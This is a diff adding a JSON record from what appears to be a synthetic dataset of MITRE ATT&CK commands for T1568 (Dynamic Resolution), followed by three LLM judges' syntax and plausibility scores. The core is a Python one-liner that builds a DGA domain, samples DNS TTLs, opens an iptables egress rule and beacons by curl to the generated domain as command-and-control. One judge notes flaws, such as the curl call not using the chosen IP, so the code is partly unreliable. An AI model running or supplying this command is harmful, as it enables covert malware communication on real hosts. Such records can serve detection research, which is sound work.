@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1568",
+  "platform": "Linux",
+  "shell": "Python",
+  "command": "python3 -c \"import random,datetime,hashlib,subprocess,time; from scapy.all import IP,UDP,DNS,DNSQR,sr1\nseed='flux-key'; tlds=['com','net']\ndef dga():\n    base=str(datetime.datetime.utcnow().strftime('%Y%m%d%H'))+seed\n    return hashlib.sha256(base.encode()).hexdigest()[:12]+'.'+random.choice(tlds)\nd=dga(); ip=None; ttl_sel=999999; port=random.choice([2053,9443,18081])\nfor _ in range(6):\n    resp=sr1(IP(dst='1.1.1.1')/UDP(dport=53)/DNS(rd=1,qd=DNSQR(qname=d,qtype='A')),timeout=2,verbose=0)\n    if resp and resp[DNS] and resp[DNS].an:\n        for a in resp[DNS].an:\n            if getattr(a,'type',0)==1 and getattr(a,'ttl',0)<ttl_sel:\n                ip=a.rdata; ttl_sel=a.ttl\n    time.sleep(random.uniform(0.3,1.1))\nif ip:\n    subprocess.run(['iptables','-I','OUTPUT','-p','tcp','-d',ip,'--dport',str(port),'-j','ACCEPT'])\n    subprocess.run(['curl','-sS','--connect-timeout','3',f'http://{d}:{port}/b'])\n    print(d,ip,port,'ttl',ttl_sel)\"",
+  "explanation": "Samples fast-flux responses for a single DGA domain and selects the IP with the shortest TTL to rotate C2 endpoints frequently.",
+  "rationale_steps": [
+    "Build a time-based DGA domain to anchor fast-flux.",
+    "Issue repeated scapy DNS queries and observe TTL variance.",
+    "Choose the lowest-TTL IP for rapid rotation and minimal persistence.",
+    "Permit egress to that IP/port and beacon with jittered timing."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-PYTHON-T1568-c17789a5-51caaca6",
+  "source_prompt_hash": "c17789a5",
+  "timestamp_utc": "2025-09-30T09:50:51.932802Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The Python command is well-formed with properly balanced quotes, parentheses, and braces, correct imports, valid function definitions, and proper control flow structures.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly implements the T1568 Dynamic Resolution technique by using a time-based DGA algorithm to generate domains, querying DNS with short TTLs, selecting the fastest rotating IP (lowest TTL), and establishing a connection to the generated domain on a randomized port.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-02T06:27:52.301691Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The Python script is perfectly well-formed with correct syntax, balanced quotes, valid function calls, and proper arguments for `python3 -c`, requiring no modifications to parse or run as a Python program.",
+        "semantic_score": 4,
+        "semantic_justification": "The command effectively generates a DGA domain, samples DNS responses to find a dynamically resolving IP with a short TTL, and attempts C2 beaconing, aligning well with T1568, but the `iptables` modification requires root privileges not specified in the prompt.",
+        "combined_score": 4.5,
+        "confidence": 1.0,
+        "timestamp": "2025-10-02T06:28:08.779498Z"
+      },
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "The Python command is properly quoted with valid imports, indentation, and balanced delimiters, making it parseable by python3 -c.",
+        "semantic_score": 3,
+        "semantic_justification": "It algorithmically generates a DGA domain and queries DNS to observe TTL/endpoint churn aligned with T1568, but reliance on Scapy/raw sockets and iptables without root, likely NXDOMAIN, incorrect iteration over DNS answers, and not actually using the selected IP for the curl request reduce operational plausibility.",
+        "combined_score": 4.0,
+        "confidence": 0.6,
+        "timestamp": "2025-10-02T06:29:14.140533Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 4.0,
+    "llm_average_score": 4.5,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
